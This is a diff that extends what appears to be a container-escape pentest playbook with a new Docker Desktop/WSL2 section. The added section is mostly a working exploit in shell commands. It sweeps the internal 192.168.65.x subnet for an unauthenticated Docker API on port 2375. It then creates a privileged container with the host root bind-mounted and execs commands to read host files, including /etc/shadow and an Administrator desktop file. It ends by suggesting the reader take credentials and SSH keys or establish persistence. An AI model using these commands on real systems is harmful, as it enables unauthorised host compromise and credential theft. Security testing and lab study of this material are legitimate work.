@@ -11,6 +11,8 @@ keywords:
   - pod escape
   - privileged container
   - docker socket
+  - docker desktop
+  - WSL2 container
   - k8s pentest
   - service account token
   - kubelet
@@ -86,6 +88,9 @@ cat /proc/1/cgroup 2>/dev/null | grep -qiE "docker|containerd|kubepods|lxc|podma
 # Kubernetes pod detection
 ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null && echo "KUBERNETES POD"
 env | grep -q KUBERNETES && echo "KUBERNETES POD"
+
+# Docker Desktop / WSL2 detection — narrows escape vectors significantly
+uname -r | grep -q "microsoft-standard-WSL2" && echo "DOCKER DESKTOP (WSL2 backend)"
 
 # Container runtime detection
 cat /proc/1/cgroup 2>/dev/null | head -5
@@ -582,6 +587,108 @@ docker ps
 docker run -it -v /:/host --privileged alpine chroot /host bash
 ```
 
+## Step 6b: Docker Desktop Internal API Escape
+
+**Prerequisite:** Container running on Docker Desktop (Windows or macOS host).
+Detected by `uname -r` containing `microsoft-standard-WSL2` (Windows) or
+other Docker Desktop kernel indicators.
+
+Docker Desktop runs containers inside a lightweight VM with an internal
+management network. The Docker Engine API may be exposed on this internal
+subnet without authentication — accessible from any container, even
+unprivileged ones without a mounted Docker socket.
+
+### Detection
+
+```bash
+# Confirm Docker Desktop environment
+uname -r | grep -qi "microsoft-standard-WSL2" && echo "WSL2 — Docker Desktop likely"
+
+# Check for Docker Desktop internal management subnet
+# The VM typically uses 192.168.65.0/24 for host↔VM communication
+ip route 2>/dev/null | grep "192.168.65"
+
+# Scan for unauthenticated Docker API on the internal subnet
+# Common addresses: 192.168.65.3, 192.168.65.7
+for ip in 192.168.65.3 192.168.65.4 192.168.65.5 192.168.65.6 192.168.65.7; do
+  curl -s --connect-timeout 2 "http://$ip:2375/_ping" 2>/dev/null && \
+    echo "DOCKER API FOUND: $ip:2375"
+done
+
+# If no hit on known IPs, broader sweep
+for i in $(seq 1 20); do
+  curl -s --connect-timeout 1 "http://192.168.65.$i:2375/_ping" 2>/dev/null && \
+    echo "DOCKER API FOUND: 192.168.65.$i:2375"
+done
+```
+
+### Exploitation
+
+Once the API is found, exploitation is identical to Step 6 (Remote Docker API)
+but via the internal subnet address instead of an external IP:
+
+```bash
+DOCKER_API="http://192.168.65.7:2375"  # Replace with discovered IP
+
+# Verify API access
+curl -s "$DOCKER_API/version" | python3 -m json.tool
+
+# List available images (use an existing one — no internet pull needed)
+curl -s "$DOCKER_API/images/json" | python3 -c "
+import sys,json
+for img in json.load(sys.stdin):
+    tags = img.get('RepoTags') or ['<none>']
+    print(tags[0])
+"
+
+# Create container with host filesystem mount
+# Docker Desktop maps the host filesystem under /mnt/host/ inside the VM:
+#   Windows: /mnt/host/c/ = C:\
+#   macOS: /mnt/host/Users/ = /Users/
+IMAGE="alpine"  # Use an image from the list above
+curl -s -X POST -H "Content-Type: application/json" \
+  "$DOCKER_API/containers/create?name=escape" \
+  -d '{
+    "Image": "'$IMAGE'",
+    "Cmd": ["sleep", "3600"],
+    "Mounts": [{
+      "Type": "bind",
+      "Source": "/",
+      "Target": "/host"
+    }],
+    "HostConfig": {"Privileged": true}
+  }'
+
+# Start the container
+curl -s -X POST "$DOCKER_API/containers/escape/start"
+
+# Read files from the host via exec
+# Windows host files: /host/mnt/host/c/Users/...
+# macOS host files: /host/mnt/host/Users/...
+# VM root files: /host/etc/shadow, /host/root/...
+EXEC_ID=$(curl -s -X POST -H "Content-Type: application/json" \
+  "$DOCKER_API/containers/escape/exec" \
+  -d '{"Cmd":["cat","/host/mnt/host/c/Users/Administrator/Desktop/root.txt"],"AttachStdout":true}' | \
+  python3 -c "import sys,json; print(json.load(sys.stdin)['Id'])")
+curl -s -X POST -H "Content-Type: application/json" \
+  "$DOCKER_API/exec/$EXEC_ID/start" -d '{"Detach":false}'
+
+# Cleanup
+curl -s -X POST "$DOCKER_API/containers/escape/stop"
+curl -s -X DELETE "$DOCKER_API/containers/escape"
+```
+
+**Key differences from standard remote Docker API (Step 6):**
+- No Docker socket mount needed — exploitable from unprivileged containers
+- Host filesystem is at `/mnt/host/` inside the VM, not at `/` directly
+- Windows: `C:\` maps to `/mnt/host/c/`, `D:\` to `/mnt/host/d/`
+- macOS: `/Users/` maps to `/mnt/host/Users/`
+- The API is on an internal subnet — not externally reachable
+
+**After escaping:** You have access to the host filesystem (Windows or macOS)
+through the VM's mount points. Read flags, credentials, SSH keys, or establish
+persistence. Route to host-level discovery for further post-exploitation.
+
 ## Step 7: Kubernetes — Service Account Token Exploitation
 
 **Prerequisite:** Inside a Kubernetes pod with a service account token mounted.
@@ -933,6 +1040,7 @@ Discovered other containers or Kubernetes services.
 ### No Escape Vector Found
 
 Container is properly hardened (no caps, no mounts, read-only rootfs).
+→ Check for Docker Desktop internal API (Step 6b) — works even without caps/mounts
 → Look for application-level vulns inside the container
 → Check for network access to other services (databases, internal APIs)
 → Check cloud metadata access (Step 12)
